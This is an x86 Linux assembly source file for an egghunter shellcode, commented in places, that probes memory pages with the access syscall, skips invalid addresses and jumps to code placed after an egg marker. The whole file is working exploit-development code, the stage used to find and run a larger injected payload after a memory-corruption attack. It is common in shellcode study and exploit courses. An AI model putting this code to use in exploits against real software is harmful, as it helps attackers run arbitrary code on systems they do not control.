global _start

section .text

_start:

xor ecx, ecx			;ecx = 0
mul ecx				;eax = 0, edx=0
xor ebx, ebx			;ebx = 0

next_page:
or dx, 0xfff			;Page alignemt operation

next_add:
inc edx
lea ebx, [edx+4]
push byte 0x21			; 0x21 (33) into the stack
pop eax				; syscall 33 (access)
int 0x80			; syscall

cmp al, 0xf2			; check if the access violatio (EFAULT) occurs.
jz next_page			; if EFAULT it will try next page

mov eax, dword 0x90509051	;EGG+1 loaded into eax
dec eax				; decrement to avoid the egghunter find this piece of code with this we reduce the use of one more time the scasd
mov edi, edx
scasd				; compare dword stored in edi with the egg
jnz next_add			; if not equals try next address
jmp edi				; found the egg jumps into code! \m/.\m/

